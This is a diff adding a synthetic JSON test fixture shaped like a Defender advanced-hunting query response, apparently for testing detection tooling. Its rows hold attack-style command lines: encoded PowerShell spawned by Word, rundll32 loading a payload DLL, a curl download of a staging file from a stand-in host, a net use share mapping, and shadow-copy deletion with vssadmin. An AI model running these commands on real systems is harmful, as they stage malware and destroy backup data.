@@ -1,0 +1,65 @@
+{
+  "_comment": "SYNTHETIC FIXTURE DATA. Not from a live Defender tenant. Shaped like a raw POST /api/advancedqueries/run response. Hosts and accounts are invented; IPs are RFC 5737 documentation ranges (192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24).",
+  "Schema": [
+    { "Name": "Timestamp", "Type": "DateTime" },
+    { "Name": "DeviceName", "Type": "String" },
+    { "Name": "AccountName", "Type": "String" },
+    { "Name": "FileName", "Type": "String" },
+    { "Name": "ProcessCommandLine", "Type": "String" },
+    { "Name": "InitiatingProcessFileName", "Type": "String" },
+    { "Name": "RemoteIP", "Type": "String" },
+    { "Name": "ReportId", "Type": "Int64" }
+  ],
+  "Results": [
+    {
+      "Timestamp": "2026-08-31T02:14:07.3310000Z",
+      "DeviceName": "wkstn-fixture-014.corp.example.com",
+      "AccountName": "j.doe.fixture",
+      "FileName": "powershell.exe",
+      "ProcessCommandLine": "powershell.exe -NoProfile -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACcAZgBpAHgAdAB1AHIAZQAnAA==",
+      "InitiatingProcessFileName": "winword.exe",
+      "RemoteIP": "192.0.2.44",
+      "ReportId": 100001
+    },
+    {
+      "Timestamp": "2026-08-31T02:14:52.8870000Z",
+      "DeviceName": "wkstn-fixture-014.corp.example.com",
+      "AccountName": "j.doe.fixture",
+      "FileName": "rundll32.exe",
+      "ProcessCommandLine": "rundll32.exe C:\\Users\\Public\\fixture-payload.dll,EntryPoint",
+      "InitiatingProcessFileName": "powershell.exe",
+      "RemoteIP": "198.51.100.7",
+      "ReportId": 100002
+    },
+    {
+      "Timestamp": "2026-08-31T03:02:19.1020000Z",
+      "DeviceName": "srv-fixture-db02.corp.example.com",
+      "AccountName": "svc.fixture.backup",
+      "FileName": "net.exe",
+      "ProcessCommandLine": "net.exe use \\\\srv-fixture-fs01\\share /user:corp\\svc.fixture.backup",
+      "InitiatingProcessFileName": "cmd.exe",
+      "RemoteIP": "203.0.113.19",
+      "ReportId": 100003
+    },
+    {
+      "Timestamp": "2026-08-31T03:07:44.5560000Z",
+      "DeviceName": "lt-fixture-233.corp.example.com",
+      "AccountName": "a.smith.fixture",
+      "FileName": "curl.exe",
+      "ProcessCommandLine": "curl.exe -s -o C:\\Users\\Public\\stage.bin https://updates.fixture.example.com/a",
+      "InitiatingProcessFileName": "explorer.exe",
+      "RemoteIP": "203.0.113.201",
+      "ReportId": 100004
+    },
+    {
+      "Timestamp": "2026-08-31T04:41:03.7740000Z",
+      "DeviceName": "srv-fixture-dc01.corp.example.com",
+      "AccountName": "svc.fixture.sync",
+      "FileName": "vssadmin.exe",
+      "ProcessCommandLine": "vssadmin.exe delete shadows /all /quiet",
+      "InitiatingProcessFileName": "cmd.exe",
+      "RemoteIP": "192.0.2.130",
+      "ReportId": 100005
+    }
+  ]
+}
